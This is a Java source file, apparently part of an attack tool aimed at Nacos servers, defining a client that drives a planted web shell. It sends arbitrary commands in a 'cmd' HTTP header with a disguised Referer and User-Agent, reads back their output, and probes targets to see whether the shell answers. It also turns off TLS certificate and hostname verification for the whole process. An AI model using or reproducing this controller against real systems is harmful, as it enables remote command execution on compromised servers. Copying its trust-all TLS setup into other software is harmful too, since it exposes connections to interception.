package com.alibaba.nacos.consistency.entity;

import javax.net.ssl.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.util.Random;

public class ConnectShell {
    URL url;
    String protocol;

    static{
        try{
            //设置https
            SSLContext sslcontext = SSLContext.getInstance("SSL");
            sslcontext.init(null, new TrustManager[]{new MyX509TrustManager()}, null);
            HostnameVerifier ignoreHostnameVerifier = new HostnameVerifier() {
                public boolean verify(String s, SSLSession sslsession) {
                    return true;
                }
            };
            HttpsURLConnection.setDefaultHostnameVerifier(ignoreHostnameVerifier);
            HttpsURLConnection.setDefaultSSLSocketFactory(sslcontext.getSocketFactory());
        }catch (NoSuchAlgorithmException | KeyManagementException e) {
            e.printStackTrace();
        }
    }


    /*public ConnectShell() throws IOException {

    }*/

    public ConnectShell(URL url) throws IOException {
        this.url = url;
        this.protocol = url.getProtocol();
    }


    public boolean isWebShell() throws IOException {
        Random random = new Random();
        int length = random.nextInt(5) + 5; // 随机生成字符串的长度，范围从1到10
        StringBuilder sb = new StringBuilder(length);
        for (int i = 0; i < length; i++) {
            char c = (char) (random.nextInt('z' - 'a') + 'a'); // 生成随机字符，范围从a到z
            sb.append(c);
        }
//        sb;
        String resp = execCmd("echo "+sb);
//        System.err.println(sb);
        return sb.toString().equals(resp);
    }

//    public void disconnect(){
//        if(httpconn != null){
//            httpconn.disconnect();
//        }
//        if(httpsconn != null){
//            httpsconn.disconnect();
//        }
//    }
    public String execCmd(String cmd) throws IOException {


        InputStream in = null;
        if ("http".equalsIgnoreCase(protocol)){

            HttpURLConnection httpconn = (HttpURLConnection) url.openConnection();
            // 设置自定义请求头
            httpconn.setRequestProperty("User-Agent", "Mozilla/5.0");
            httpconn.setRequestProperty("cmd", cmd);
            httpconn.setRequestProperty("x-client-data", "cmd");
            httpconn.setRequestProperty("Referer", "https://www.google.com/");
            // 设置请求方法
            httpconn.setRequestMethod("GET");
            // 获取响应码
            int responseCode = httpconn.getResponseCode();
            //System.err.println("Response Code: " + responseCode);
            if (responseCode ==200){
                in = httpconn.getInputStream();
            }else {
                in = httpconn.getErrorStream();
            }

        }else if("https".equalsIgnoreCase(protocol)){
            // 设置自定义请求头
            HttpsURLConnection httpsconn = (HttpsURLConnection) url.openConnection();
            httpsconn.setRequestProperty("User-Agent", "Mozilla/5.0");
            httpsconn.setRequestProperty("cmd", cmd);
            httpsconn.setRequestProperty("x-client-data", "cmd");
            httpsconn.setRequestProperty("Referer", "https://www.google.com/");
            // 设置请求方法
            httpsconn.setRequestMethod("GET");
            // 获取响应码
            int responseCode = httpsconn.getResponseCode();
            //System.err.println("Response Code: " + responseCode);

            if (responseCode ==200){
                in = httpsconn.getInputStream();
            }else {
                in = httpsconn.getErrorStream();
            }

        }
        // 读取响应内容
        if(in != null){
            BufferedReader reader = new BufferedReader(new InputStreamReader(in));
            String line;
            StringBuilder response = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();
            // 输出响应内容
            // System.err.println("Response: " + response.toString());

            return response.toString();
        }
        return null;
    }
}
